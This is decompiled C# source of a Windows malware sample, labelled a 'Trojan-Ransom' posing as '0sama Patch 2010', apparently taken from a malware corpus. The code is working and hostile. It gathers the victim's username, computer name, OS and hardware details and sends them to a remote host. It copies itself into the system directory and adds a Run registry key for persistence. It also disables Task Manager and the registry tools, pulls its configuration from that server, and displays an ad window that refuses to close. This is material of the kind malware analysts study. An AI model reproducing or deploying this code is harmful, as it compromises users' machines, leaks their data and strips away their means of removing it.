// Decompiled with JetBrains decompiler
// Type: Patch_All.Form1
// Assembly: 0sama Patch 2010, Version=1.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5868DC3C-84C3-43AF-BC83-178EF705D73B
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Foreign.mmff-f8c12bbda890968abe8e1e23bbc5ed408181daa778d937be9ff2e19ae17ce192.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Patch_All.My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace Patch_All
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    [AccessedThroughProperty("WebBrowser1")]
    private WebBrowser _WebBrowser1;
    [AccessedThroughProperty("WebBrowser2")]
    private WebBrowser _WebBrowser2;
    [AccessedThroughProperty("WebBrowser3")]
    private WebBrowser _WebBrowser3;
    [AccessedThroughProperty("Timer1")]
    private System.Windows.Forms.Timer _Timer1;
    [AccessedThroughProperty("WebBrowser4")]
    private WebBrowser _WebBrowser4;
    private string infospc1;
    private bool permettrequitter;
    private string lienpub;
    private string lienrefresh;
    private RegistryKey cle;
    private string lesitepage;
    private string premp;
    private string deremp;
    private string codehtmltemp;
    private string nomexe;
    private string timerefr;
    private int tailledumot;
    private string siite;
    private string codehtml;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.Closing += new CancelEventHandler(this.Form1_Closing);
      lock (Form1.__ENCList)
        Form1.__ENCList.Add(new WeakReference((object) this));
      this.permettrequitter = false;
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.WebBrowser1 = new WebBrowser();
      this.WebBrowser2 = new WebBrowser();
      this.WebBrowser3 = new WebBrowser();
      this.Timer1 = new System.Windows.Forms.Timer(this.components);
      this.WebBrowser4 = new WebBrowser();
      this.SuspendLayout();
      this.WebBrowser1.Dock = DockStyle.Fill;
      WebBrowser webBrowser1_1 = this.WebBrowser1;
      Point point1 = new Point(0, 0);
      Point point2 = point1;
      webBrowser1_1.Location = point2;
      WebBrowser webBrowser1_2 = this.WebBrowser1;
      Size size1 = new Size(20, 20);
      Size size2 = size1;
      webBrowser1_2.MinimumSize = size2;
      this.WebBrowser1.Name = "WebBrowser1";
      this.WebBrowser1.ScriptErrorsSuppressed = true;
      this.WebBrowser1.ScrollBarsEnabled = false;
      WebBrowser webBrowser1_3 = this.WebBrowser1;
      size1 = new Size(171, 611);
      Size size3 = size1;
      webBrowser1_3.Size = size3;
      this.WebBrowser1.TabIndex = 0;
      WebBrowser webBrowser2_1 = this.WebBrowser2;
      point1 = new Point(396, 12);
      Point point3 = point1;
      webBrowser2_1.Location = point3;
      WebBrowser webBrowser2_2 = this.WebBrowser2;
      size1 = new Size(20, 20);
      Size size4 = size1;
      webBrowser2_2.MinimumSize = size4;
      this.WebBrowser2.Name = "WebBrowser2";
      this.WebBrowser2.ScriptErrorsSuppressed = true;
      this.WebBrowser2.ScrollBarsEnabled = false;
      WebBrowser webBrowser2_3 = this.WebBrowser2;
      size1 = new Size(162, 63);
      Size size5 = size1;
      webBrowser2_3.Size = size5;
      this.WebBrowser2.TabIndex = 1;
      WebBrowser webBrowser3_1 = this.WebBrowser3;
      point1 = new Point(396, 81);
      Point point4 = point1;
      webBrowser3_1.Location = point4;
      WebBrowser webBrowser3_2 = this.WebBrowser3;
      size1 = new Size(20, 20);
      Size size6 = size1;
      webBrowser3_2.MinimumSize = size6;
      this.WebBrowser3.Name = "WebBrowser3";
      this.WebBrowser3.ScriptErrorsSuppressed = true;
      this.WebBrowser3.ScrollBarsEnabled = false;
      WebBrowser webBrowser3_3 = this.WebBrowser3;
      size1 = new Size(162, 63);
      Size size7 = size1;
      webBrowser3_3.Size = size7;
      this.WebBrowser3.TabIndex = 1;
      this.Timer1.Interval = 10000;
      WebBrowser webBrowser4_1 = this.WebBrowser4;
      point1 = new Point(582, 236);
      Point point5 = point1;
      webBrowser4_1.Location = point5;
      WebBrowser webBrowser4_2 = this.WebBrowser4;
      size1 = new Size(20, 20);
      Size size8 = size1;
      webBrowser4_2.MinimumSize = size8;
      this.WebBrowser4.Name = "WebBrowser4";
      this.WebBrowser4.ScriptErrorsSuppressed = true;
      this.WebBrowser4.ScrollBarsEnabled = false;
      WebBrowser webBrowser4_3 = this.WebBrowser4;
      size1 = new Size(103, 37);
      Size size9 = size1;
      webBrowser4_3.Size = size9;
      this.WebBrowser4.TabIndex = 2;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.AppWorkspace;
      size1 = new Size(171, 611);
      this.ClientSize = size1;
      this.ControlBox = false;
      this.Controls.Add((Control) this.WebBrowser3);
      this.Controls.Add((Control) this.WebBrowser2);
      this.Controls.Add((Control) this.WebBrowser1);
      this.Controls.Add((Control) this.WebBrowser4);
      this.FormBorderStyle = FormBorderStyle.None;
      this.MaximizeBox = false;
      this.MinimizeBox = false;
      this.Name = nameof (Form1);
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "By Mehdiana15 [MidoZik]";
      this.TopMost = true;
      this.ResumeLayout(false);
    }

    internal virtual WebBrowser WebBrowser1
    {
      [DebuggerNonUserCode] get => this._WebBrowser1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        WebBrowserDocumentCompletedEventHandler completedEventHandler = new WebBrowserDocumentCompletedEventHandler(this.WebBrowser1_DocumentCompleted);
        if (this._WebBrowser1 != null)
          this._WebBrowser1.DocumentCompleted -= completedEventHandler;
        this._WebBrowser1 = value;
        if (this._WebBrowser1 == null)
          return;
        this._WebBrowser1.DocumentCompleted += completedEventHandler;
      }
    }

    internal virtual WebBrowser WebBrowser2
    {
      [DebuggerNonUserCode] get => this._WebBrowser2;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._WebBrowser2 = value;
    }

    internal virtual WebBrowser WebBrowser3
    {
      [DebuggerNonUserCode] get => this._WebBrowser3;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._WebBrowser3 = value;
    }

    internal virtual System.Windows.Forms.Timer Timer1
    {
      [DebuggerNonUserCode] get => this._Timer1;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._Timer1 != null)
          this._Timer1.Tick -= eventHandler;
        this._Timer1 = value;
        if (this._Timer1 == null)
          return;
        this._Timer1.Tick += eventHandler;
      }
    }

    internal virtual WebBrowser WebBrowser4
    {
      [DebuggerNonUserCode] get => this._WebBrowser4;
      [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set => this._WebBrowser4 = value;
    }

    public object infospc()
    {
      this.infospc1 = this.infospc1 + "?UserName=" + Environment.UserName.ToString();
      this.infospc1 = this.infospc1 + "&ComputerName=" + SystemInformation.ComputerName;
      this.infospc1 = this.infospc1 + "&WorkingArea=w." + SystemInformation.WorkingArea.Width.ToString() + ".h." + SystemInformation.WorkingArea.Height.ToString();
      this.infospc1 = this.infospc1 + "&Network=" + Conversions.ToString(SystemInformation.Network);
      this.infospc1 = this.infospc1 + "&PowerStatus=" + SystemInformation.PowerStatus.ToString();
      this.infospc1 = this.infospc1 + "&ProcessorCount=" + Conversions.ToString(Environment.ProcessorCount);
      int processorCount = Environment.ProcessorCount;
      Environment.OSVersion.ToString();
      this.infospc1 = this.infospc1 + "&OSVersion=" + MyProject.Computer.Info.OSFullName;
      this.infospc1 = this.infospc1 + "&exepath=" + Environment.GetCommandLineArgs()[0];
      this.infospc1 = this.infospc1 + "&SystemDirectory=" + Environment.SystemDirectory;
      this.infospc1 = this.infospc1 + "&langue=" + MyProject.Computer.Info.InstalledUICulture.ToString();
      this.infospc1 = this.infospc1 + "&ram=" + Conversions.ToString(Math.Round((double) MyProject.Computer.Info.TotalPhysicalMemory / 1000000000.0, 3));
      return (object) this.infospc1;
    }

    public object bloquer()
    {
      try
      {
        this.cle = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        this.cle.SetValue("Windows Start", (object) (Environment.SystemDirectory + this.nomexe), RegistryValueKind.String);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        FileSystem.FileCopy(this.StartupName, Environment.SystemDirectory + this.nomexe);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        this.cle = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        this.cle.SetValue("DisableTaskMgr", (object) 1, RegistryValueKind.DWord);
        this.cle.SetValue("DisableRegistryTools", (object) 1, RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (object) 0;
    }

    public object Pagedemarrage()
    {
      try
      {
        this.cle = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        this.cle = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
        this.cle.SetValue("DisableTaskMgr", (object) 1, RegistryValueKind.DWord);
        this.cle.SetValue("DisableRegistryTools", (object) 1, RegistryValueKind.DWord);
        this.cle.Close();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      return (object) 0;
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      this.DisableSound();
      this.Timer1.Start();
      if (MyProject.Computer.Network.IsAvailable)
      {
        this.Verifwebsite();
        this.Timer1.Interval = 5000;
        this.bloquer();
        this.Pagedemarrage();
        this.WebBrowser3.Navigate(this.lienrefresh);
        this.WebBrowser1.Navigate(this.lesitepage);
        NewLateBinding.LateCall((object) this.WebBrowser2, (System.Type) null, "Navigate", new object[1]
        {
          RuntimeHelpers.GetObjectValue(this.infospc())
        }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
      }
      else
      {
        this.Hide();
        this.nomexe = "\\MicrosoftMehdi.exe";
        this.bloquer();
        this.Pagedemarrage();
        this.lesitepage = "http://programmes.midozik.com/pagesweb/v2/ads.php?height=600&width=160";
        this.WebBrowser1.Navigate(this.lesitepage);
        Thread.Sleep(1200000);
        while (!MyProject.Computer.Network.IsAvailable)
        {
          Thread.Sleep(60000);
          Application.DoEvents();
        }
        if (MyProject.Computer.Network.IsAvailable)
        {
          this.WebBrowser3.Navigate(this.lienrefresh);
          this.WebBrowser1.Navigate(this.lesitepage);
          NewLateBinding.LateCall((object) this.WebBrowser2, (System.Type) null, "Navigate", new object[1]
          {
            RuntimeHelpers.GetObjectValue(this.infospc())
          }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
          this.Show();
        }
      }
    }

    public string StartupName => Path.GetFileName(Application.ExecutablePath);

    private void WebBrowser1_DocumentCompleted(
      object sender,
      WebBrowserDocumentCompletedEventArgs e)
    {
      if (Operators.CompareString(this.WebBrowser1.Url.ToString(), this.lesitepage, false) == 0)
        return;
      this.permettrequitter = true;
      this.Close();
    }

    private void Form1_Closing(object sender, CancelEventArgs e)
    {
      if (!this.permettrequitter)
      {
        e.Cancel = true;
        int num = (int) MessageBox.Show("-Click in a link To Quit." + Environment.NewLine + "-Appuyez sur un lien pour quitter.");
      }
      else
        e.Cancel = false;
    }

    private void Timer1_Tick(object sender, EventArgs e)
    {
      this.WebBrowser3.Navigate(this.lienrefresh);
      this.WebBrowser4.Navigate(this.lienrefresh);
    }

    private void Verifwebsite()
    {
      this.siite = "http://programmes.midozik.com/pagesweb/v2/config-oussama.txt";
      WebResponse response = WebRequest.Create(this.siite).GetResponse();
      try
      {
        this.codehtml = new StreamReader(response.GetResponseStream()).ReadToEnd();
      }
      finally
      {
        response?.Close();
      }
      this.codehtmltemp = this.codehtml;
      if (this.codehtmltemp.Contains("siteads : "))
      {
        this.premp = Conversions.ToString(checked (Strings.InStr(this.codehtmltemp, "siteads : ") + "siteads : ".Length));
        this.codehtmltemp = Strings.Mid(this.codehtmltemp, Conversions.ToInteger(this.premp));
        this.deremp = Conversions.ToString(Strings.InStr(this.codehtmltemp, ";"));
        this.tailledumot = checked ((int) Math.Round(unchecked (Conversions.ToDouble(this.deremp) - 1.0)));
        this.lesitepage = Strings.Mid(this.codehtmltemp, 1, this.tailledumot);
      }
      else
        this.lesitepage = "http://programmes.midozik.com/pagesweb/v2/ads.php?height=600&width=160";
      this.codehtmltemp = this.codehtml;
      if (this.codehtmltemp.Contains("exename : "))
      {
        this.premp = Conversions.ToString(checked (Strings.InStr(this.codehtmltemp, "exename : ") + "exename : ".Length));
        this.codehtmltemp = Strings.Mid(this.codehtmltemp, Conversions.ToInteger(this.premp));
        this.deremp = Conversions.ToString(Strings.InStr(this.codehtmltemp, ";"));
        this.tailledumot = checked ((int) Math.Round(unchecked (Conversions.ToDouble(this.deremp) - 1.0)));
        this.nomexe = Strings.Mid(this.codehtmltemp, 1, this.tailledumot);
      }
      else
        this.nomexe = "/MicrosoftFmwork.exe";
      this.codehtmltemp = this.codehtml;
      if (this.codehtmltemp.Contains("siteref : "))
      {
        this.premp = Conversions.ToString(checked (Strings.InStr(this.codehtmltemp, "siteref : ") + "siteref : ".Length));
        this.codehtmltemp = Strings.Mid(this.codehtmltemp, Conversions.ToInteger(this.premp));
        this.deremp = Conversions.ToString(Strings.InStr(this.codehtmltemp, ";"));
        this.tailledumot = checked ((int) Math.Round(unchecked (Conversions.ToDouble(this.deremp) - 1.0)));
        this.lienrefresh = Strings.Mid(this.codehtmltemp, 1, this.tailledumot);
      }
      else
        this.lienrefresh = "http://programmes.midozik.com/pagesweb/v2/refresh.php";
      this.codehtmltemp = this.codehtml;
      if (this.codehtmltemp.Contains("infospc : "))
      {
        this.premp = Conversions.ToString(checked (Strings.InStr(this.codehtmltemp, "infospc : ") + "infospc : ".Length));
        this.codehtmltemp = Strings.Mid(this.codehtmltemp, Conversions.ToInteger(this.premp));
        this.deremp = Conversions.ToString(Strings.InStr(this.codehtmltemp, ";"));
        this.tailledumot = checked ((int) Math.Round(unchecked (Conversions.ToDouble(this.deremp) - 1.0)));
        this.infospc1 = Strings.Mid(this.codehtmltemp, 1, this.tailledumot);
      }
      else
        this.infospc1 = "http://programmes.midozik.com/pagesweb/v2/";
      this.codehtmltemp = this.codehtml;
      if (this.codehtmltemp.Contains("timerss : "))
      {
        this.premp = Conversions.ToString(checked (Strings.InStr(this.codehtmltemp, "timerss : ") + "timerss : ".Length));
        this.codehtmltemp = Strings.Mid(this.codehtmltemp, Conversions.ToInteger(this.premp));
        this.deremp = Conversions.ToString(Strings.InStr(this.codehtmltemp, ";"));
        this.tailledumot = checked ((int) Math.Round(unchecked (Conversions.ToDouble(this.deremp) - 1.0)));
        this.timerefr = Strings.Mid(this.codehtmltemp, 1, this.tailledumot);
      }
      else
        this.timerefr = Conversions.ToString(5000);
    }

    public void DisableSound()
    {
      string str1 = "%SystemRoot%\\Media\\";
      string str2;
      if (Environment.OSVersion.Version.Major == 5 && Environment.OSVersion.Version.Minor > 0)
      {
        str2 = str1 + "Windows XP Start.wav";
      }
      else
      {
        if (Environment.OSVersion.Version.Major != 6)
          return;
        str2 = str1 + "Windows Navigation Start.wav";
      }
      Registry.CurrentUser.OpenSubKey("AppEvents\\Schemes\\Apps\\Explorer\\Navigating\\.Current", true).SetValue((string) null, (object) "", RegistryValueKind.ExpandString);
    }
  }
}
